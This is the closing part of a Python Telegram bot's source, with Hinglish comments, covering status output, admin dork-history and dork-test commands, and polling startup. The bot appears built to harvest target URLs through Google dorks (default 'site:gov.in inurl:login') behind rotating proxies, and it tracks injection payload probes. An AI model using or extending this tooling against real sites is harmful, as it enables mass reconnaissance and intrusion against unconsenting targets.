           "🌐 DNS: system resolver (Termux-safe)\n"
           "🔁 Rotating proxy: <code>%s</code>\n"
           "📦 Core: <b>%s</b>\n"
           "🧩 Build: <code>%s</code>\n"
           "🛡 Silent-guard: %s · 💉 payloads: <code>%d</code> · ⚙️ parser-cfg: %s\n"
           "🔐 Config: %s\n"
           "🎨 Premium emoji: <code>%d</code> set · %s\n"
           "🕒 Loaded: <code>%s</code>")
    txt = txt % (selfcheck.get("username") or "?",
                 F(THEMES[theme_name()]["label"], T()["head"]),
                 up // 3600, (up % 3600) // 60, os.getpid(), len(USERS), gj,
                 ("%d set" % len(rot_proxies())) if rot_proxies() else "none",
                 VERSION, BUILD,
                 "✅ ON" if globals().get("SILENT_GUARD") else "⚠️ OFF",
                 len(INJ_PROBES),
                 "✅ ON" if "cb_parse_cfg" in globals() else "⚠️ OFF",
                 ("<code>%s</code> · admins %d" %
                  (os.path.basename(CONFIG_PATH) if CONFIG_PATH else "⚠️ none (bot.py se)",
                   len(ADMIN_IDS))),
                 len(premium_slots()),
                 "ON" if EMOJI_OK[0] else "OFF (normal emoji)",
                 BUILD_TS)
    await msg.edit_text(txt, parse_mode=ParseMode.HTML)


async def cmd_fresh(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """ /freshclear — fresh history saaf | /fresh — stats """
    uid = update.effective_user.id
    if not is_admin(uid):
        await update.effective_message.reply_text("🚫 Admin only.")
        return
    arg = (context.args or [""])[0].lower() if context.args else ""
    if arg in ("clear", "reset", "clean"):
        n = dork_seen_clear()
        await update.effective_message.reply_text(
            "🧹 Fresh history cleared — <code>%s</code> dorks removed.\n"
            "All dorks will be treated as new again." % fmt(n),
            parse_mode=ParseMode.HTML)
        return
    await update.effective_message.reply_text(
        (H("FRESH SYSTEM", "no duplicate dorks") + "\n\n"
         "📚 History : <code>%s</code> dorks\n"
         "🆕 Naya batch banate waqt purane skip hote hain\n"
         "🎯 Isse har baar <b>fresh URLs</b> milte hain\n\n"
         "🧹 Clear karne ke liye: <code>/fresh clear</code>"
         % fmt(dork_seen_count())),
        parse_mode=ParseMode.HTML)


async def cmd_gtest(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/gtest <dork> — free Google endpoint live test (proof)."""
    uid = update.effective_user.id
    if not is_admin(uid):
        await update.effective_message.reply_text("🚫 Admin only.")
        return
    dork = " ".join(context.args or []).strip()
    if not dork:
        dork = "site:gov.in inurl:login"
    if not gj_enabled():
        await update.effective_message.reply_text(
            "⚪ Free Google is OFF. Turn it on:\n<code>/setkey gjerm https://...</code>",
            parse_mode=ParseMode.HTML)
        return
    msg = await update.effective_message.reply_text(
        "🐦 Testing free Google…\n<code>%s</code>" % esc(dork[:100]), parse_mode=ParseMode.HTML)
    t0 = time.time()
    conn = mk_connector(limit=4)
    async with aiohttp.ClientSession(connector=conn) as session:
        urls = await gjerm_search(session, dork, pages=2)
    took = time.time() - t0
    if not urls:
        await msg.edit_text(
            (H("FREE GOOGLE — FAIL", "%.1fs" % took) + "\n\n"
             "❌ 0 URLs mile.\n"
             "• Endpoint band ho sakta hai\n"
             "• Ya rate-limit lag gaya\n\n"
             "🔁 Thodi der baad try karo, ya naya URL:\n"
             "<code>/setkey gjerm https://...</code>"),
            parse_mode=ParseMode.HTML)
        return
    body = "\n".join("%d. <code>%s</code>" % (i, esc(u[:95])) for i, u in enumerate(urls[:12], 1))
    await msg.edit_text(
        (H("FREE GOOGLE — WORKING ✅", "%.1fs • %d URLs" % (took, len(urls))) + "\n\n"
         "🎯 Dork: <code>%s</code>\n"
         "📊 Pages: 2\n"
         "⚡ Speed: <code>%.1fs</code>\n"
         "🔑 Key: <b>nahi chahiye</b>\n\n"
         "<b>Real URLs:</b>\n%s" % (esc(dork[:80]), took, body)),
        parse_mode=ParseMode.HTML)


async def _serve(app, stop_ev=None) -> None:
    """Apna polling loop — asyncio.get_event_loop() use NAHI karta.

    PTB ka run_polling() Python 3.12+ / 3.14 pe 'There is no current event
    loop' deta hai, isliye yahan manually initialize/start/poll karte hain.
    """
    if stop_ev is None:
        stop_ev = asyncio.Event()
    _install_signals(stop_ev)
    await app.initialize()
    await _self_check(app)
    # duplicate instance check — Telegram 409 Conflict sabse common "bot dead" karan
    try:
        import aiohttp as _aio
        async with _aio.ClientSession(connector=mk_connector()) as _s:
            async with _s.get("https://api.telegram.org/bot%s/getWebhookInfo" % TOKEN,
                              timeout=_aio.ClientTimeout(total=8)) as _r:
                _j = await _r.json(content_type=None)
        _wh = (_j.get("result") or {}).get("url") or ""
        _pend = (_j.get("result") or {}).get("pending_update_count") or 0
        if _wh:
            logger.warning("⚠️ Webhook is set (%s) — polling may conflict. Removing…", _wh[:60])
            from telegram import Bot as _Bot
            await _Bot(TOKEN).delete_webhook(drop_pending_updates=False)
        elif _pend:
            logger.info("📥 %d pending updates in queue (drop_pending_updates=True, "
                        "purane messages skip honge)", _pend)
    except Exception as _exc:
        logger.info("webhook check skip: %s", str(_exc)[:90])
    await app.start()
    try:
        await app.updater.start_polling(
            allowed_updates=Update.ALL_TYPES,
            drop_pending_updates=True,
            poll_interval=0.5,
            timeout=30,
        )
    except Exception as exc:
        msg = str(exc).lower()
        if "conflict" in msg or "terminated by other" in msg:
            print("\n" + "=" * 62)
            print("  ❌ BOT ALREADY RUNNING ELSEWHERE (Telegram 409)")
            print("=" * 62)
            print("  Ek hi token pe doosra instance chal raha hai.")
            print("  Isi phone pe ho to:")
            print("      screen -ls")
            print("      screen -S snake -X quit")
            print("      pgrep -af bot.py        # koi bacha ho to kill -9 <PID>")
            print("      ./restart.sh")
            print("  VPS pe bhi chal raha ho to wahan se band karo")
            print("  (sudo systemctl stop snake) — sirf EK jagah chalna chahiye.")
            print("=" * 62 + "\n")
        raise
    logger.info("✅ Polling running — the bot is live. (Ctrl+C or ./stop.sh to stop)")
    try:
        await stop_ev.wait()
    except (KeyboardInterrupt, SystemExit):
        pass
    finally:
        logger.info("⏹ Shutting down…")
        try:
            await app.updater.stop()
        except Exception:
            pass
        try:
            await app.stop()
        except Exception:
            pass
        try:
            await app.shutdown()
        except Exception:
            pass
        logger.info("👋 Stopped.")


def _run_loop(app, stop_ev=None) -> None:
    """Naya event loop bana ke chalata hai (3.14 safe)."""
    try:
        loop = asyncio.new_event_loop()
    except Exception:
        loop = None
    if loop is None:
        asyncio.run(_serve(app, stop_ev))
        return
    asyncio.set_event_loop(loop)
    try:
        loop.run_until_complete(_serve(app, stop_ev))
    except KeyboardInterrupt:
        pass
    finally:
        try:
            pending = asyncio.all_tasks(loop)
            for t in pending:
                t.cancel()
            if pending:
                loop.run_until_complete(asyncio.gather(*pending, return_exceptions=True))
        except Exception:
            pass
        try:
            loop.run_until_complete(loop.shutdown_asyncgens())
        except Exception:
            pass
        try:
            asyncio.set_event_loop(None)
        except Exception:
            pass
        try:
            loop.close()
        except Exception:
            pass


def main():
    logger.info("🐍 %s CORE %s starting… (Python %s • PTB %s)",
                BRAND, VERSION, platform.python_version(),
                getattr(__import__("telegram"), "__version__", "?"))
    try:
        load_proxy_pool()
    except Exception:
        pass
    logger.info("✅ %s CORE ready — %d sources • %s dorks space",
                BRAND, len(PROXY_SOURCES), fmt(db_counts()["dorks"]))
    app = build_app()
    try:
        _run_loop(app)
    except KeyboardInterrupt:
        print("\n👋 Stopped.")
    except Exception as exc:
        logger.exception("Bot crash: %s", exc)
        print("\n" + "=" * 62)
        print("  ❌ BOT CRASH: %s" % str(exc)[:200])
        print("=" * 62)
        print("  Jaanch ke points:")
        print("   • Token wrong/revoked?    → ./setconfig.sh --token <new>")
        print("   • 2 bots running?         → ./stop.sh && ./start.sh")
        print("   • No internet?            → ping google.com")
        print("   • Purani file pe wapas    → ls backups/ ; cp backups/<file> bot.py")
        print("=" * 62 + "\n")
        raise


if __name__ == "__main__":
    main()
